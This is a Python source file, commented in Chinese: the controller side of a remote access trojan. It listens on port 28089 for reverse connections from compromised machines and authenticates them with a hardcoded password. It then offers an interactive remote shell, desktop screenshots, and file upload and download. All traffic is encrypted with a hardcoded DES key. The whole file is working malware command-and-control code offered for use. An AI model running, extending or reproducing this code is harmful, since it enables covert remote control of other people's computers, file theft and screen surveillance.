#-*- coding : gbk -*-
# coding: gbk
import socket
import time
from os import stat
from os.path import exists
from pyDes import des

use='''
5种功能
tkphoto-桌面截图           使用方法：tkphoto 截图名字（仅名称即可） 保存地址(带文件名的绝对路径或相对路径)                                例：tkphoto test.jpg D:\\test.jpg
nrcv-无法进行交互的命令      使用方法：nrcv 执行的命令                                                                            例：nrcv natepad.exe
fput-上传文件              使用方法：fput 本地文件地址（带文件名的绝对路径或相对路径） 上传的地址(带文件名的绝对路径或相对路径)                例：fput D:\\test.exe C:\\test.exe
fget-下载文件              使用方法:fget 远程文件地址 本地保存地址                                                                 例：fget C:\Windows\win.ini E:\win.ini
正常命令可直接进行输入，dir、whoami、ipconfig等
注：自娱自乐型。'''
print(use)
#加解密
def encrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")  # self.key的bytes长度是16的倍数即可， self.iv必须是16位
    length = 16
    count = len(text)
    if (count % length != 0):
        add = length - (count % length)
    else:
        add = 0
    text = text + ("\0".encode() * add)  # 这里的"\0"必须编码成bytes，不然无法和text拼接
    ciphertext = cryptor.encrypt(text)
    return ciphertext

def decrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")
    plain_text = cryptor.decrypt(text).decode('gbk')
    return plain_text.rstrip("\0")  #有的博客上有这句，其实decode解码之后"\0"自动就没有了


#传文件
def putfile(filepath):
    try:
        # 定义定义文件信息。128s表示文件名为128bytes长，l表示一个int或log文件类型，在此为文件大小
        # 定义文件头信息，包含文件名和文件大小
        # 将传输文件以二进制的形式分多次上传至服务器
        if exists(filepath):
            size = stat(filepath).st_size
            conn.sendall(encrypt(str(size).encode("gbk")))
            time.sleep(1)
            fp = open(filepath, 'rb')
            while 1:
                data = fp.read(1024)
                if not data:
                    print('{0} file send over...'.format(ldata[1]))
                    break
                conn.send(data)
            fp.close()
            return 1
        else:
            print("文件不存在！")
            return 0
    except Exception as e:
        print(e)
        return 0
#传文件
#传文件加密
def sputfile(filepath):
    try:
        # 定义定义文件信息。128s表示文件名为128bytes长，l表示一个int或log文件类型，在此为文件大小
        # 定义文件头信息，包含文件名和文件大小
        # 将传输文件以二进制的形式分多次上传至服务器
        if exists(filepath):
            conn.sendall(encrypt("Yes".encode('gbk')))
            if decrypt(conn.recv(1024)) == "ok":
                fp = open(filepath, 'rb')
                data=fp.read()
                # while 1:
                #     data = fp.read(1024)
                #     if not data:
                #         # print('{0} file send over...'.format(ldata[1]))
                #         break
                conn.send(encrypt(data))
                fp.close()
                print("It is ok!")
                return 1
            else:
                print("something is wrong!")
                return 0
        else:
            print("文件不存在！")
            return 0
    except Exception as e:
        print(e)
        return 0
#收文件
def getfile(filepath):
    try:
        # 存储在该脚本所在目录下面
        filesize = decrypt(conn.recv(1024))
        if filesize=="No":
            print("文件不存在！")
        else:
            recvd_size = 0  # 定义已接收文件的大小
            fp = open('{}'.format(filepath), 'wb')
            # print('start receiving...')
            # 将分批次传输的二进制流依次写入到文件
            while not recvd_size == int(filesize):
                if int(filesize) - recvd_size > 1024:
                    data = conn.recv(1024)
                    recvd_size += len(data)
                else:
                    data = conn.recv(int(filesize) - recvd_size)
                    recvd_size = int(filesize)
                fp.write(data)
            fp.close()
            print("It is ok!")
    except  Exception as e:
        print(e)
#收文件加密
def sgetfile(filepath):
    try:
        # 存储在该脚本所在目录下面
        filexists  = decrypt(conn.recv(1024))
        if filexists=="No":
            print("文件不存在！")
        else:
            fp = open('{}'.format(filepath), 'wb')
            # print('start receiving...')
            # 将分批次传输的二进制流依次写入到文件
            data=decrypt(conn.recv(1024000))
            fp.write(data.encode('gbk'))
            fp.close()
            print("It is ok!")
            return 1
    except  Exception as e:
        print(e)
        return 0

def listsize(m):
    if m==3:
        return 1
    elif m==4:
        return 1
    else:
        return 0

while True:
    address_server = ('0.0.0.0', 28089)
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(address_server)
    sock.listen()
    print("等待回连....")
    conn,address = sock.accept()
    ret = conn.recv(1024)
    ret=decrypt(ret)
    if ret=="kj#$!#@&*DZF555":
        print("接收回连成功！")
        ret = decrypt(conn.recv(1024))
        print("RHostname:", ret)
        while True:
            yed=input('shell in:')
            ldata = list(yed.split())
            if yed=="":
                print("shell in:")
            else:
                #搞截图
                if ldata[0]=="tkphoto" and len(ldata)==3:
                    conn.sendall(encrypt(yed.encode('gbk')))
                    getfile(ldata[2])
                    continue
                #服务端请求客户端文件
                elif ldata[0] == "fget" and listsize(len(ldata)):
                    if ldata[1] == "-s" and len(ldata)==4:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        sgetfile(ldata[3])
                        continue
                    elif len(ldata)==3:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        getfile(ldata[2])
                        continue
                    else:
                        continue
                # 服务端传输客户端文件
                elif ldata[0] == "fput" and listsize(len(ldata)):
                    conn.sendall(encrypt(yed.encode('gbk')))
                    if ldata[1]=="-s" and len(ldata)==4:
                        if sputfile(ldata[2]):
                            continue
                        else:
                            conn.sendall(encrypt("No".encode('gbk')))
                            continue
                    elif len(ldata)==3:
                        if putfile(ldata[1]):
                            continue
                        else:
                            conn.sendall(encrypt("No".encode('gbk')))
                            continue
                    else:
                        continue
                #正常操作执行命令
                else:
                    if 'quit' == yed:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        break
                    else:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        ret = decrypt(conn.recv(10240000))
                        print('shell out:\n', ret)
    else:
        continue
    conn.close()
    break

